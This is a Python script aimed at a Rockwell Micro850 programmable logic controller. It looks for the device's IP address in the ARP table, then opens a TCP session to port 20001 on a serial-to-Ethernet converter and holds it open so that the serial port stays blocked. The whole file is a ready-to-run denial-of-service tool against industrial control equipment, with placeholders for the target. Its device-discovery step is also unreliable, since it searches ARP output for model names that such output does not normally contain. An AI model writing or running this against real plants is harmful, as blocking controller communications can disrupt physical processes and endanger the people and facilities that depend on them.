import socket
import subprocess

def find_plc_ip():
    """
    Discover the IP address of the Rockwell Micro850 PLC.
    This function assumes that the PLC is reachable via ARP or a similar method.
    """
    try:
        # Example command to find the PLC IP (adjust based on your network setup)
        result = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        lines = result.stdout.split('\n')
        
        # Look for the PLC in the ARP table (adjust based on your PLC's MAC or IP pattern)
        for line in lines:
            if "Micro850" in line or "Rockwell" in line:  # Replace with a unique identifier
                ip = line.split()[0]
                return ip
    except Exception as e:
        print(f"Error finding PLC IP: {e}")
    return None

def block_serial_com(ip, port):
    """
    Block a serial COM port by initiating and holding open a TCP session.
    """
    try:
        # Create a socket and connect to the serial-to-Ethernet converter
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)  # Set a timeout for the connection attempt
        sock.connect((ip, port))
        print(f"Successfully blocked serial COM port {port} on IP {ip}")
        return sock  # Return the socket to keep the connection open
    except Exception as e:
        print(f"Error blocking serial COM port {port}: {e}")
    return None

def main():
    # Step 1: Find the PLC's IP address
    plc_ip = find_plc_ip()
    if not plc_ip:
        print("Could not find the PLC's IP address.")
        return
    
    print(f"Found PLC IP: {plc_ip}")
    
    # Step 2: Block the serial COM port
    serial_port = 20001  # Replace with the target serial COM port
    sock = block_serial_com(plc_ip, serial_port)
    
    if sock:
        # Keep the connection open to block the port
        print("Holding the connection open to block the port. Press Ctrl+C to exit.")
        try:
            while True:
                pass  # Keep the script running
        except KeyboardInterrupt:
            print("Closing the connection.")
            sock.close()
    else:
        print("Failed to block the serial COM port.")

if __name__ == "__main__":
    main()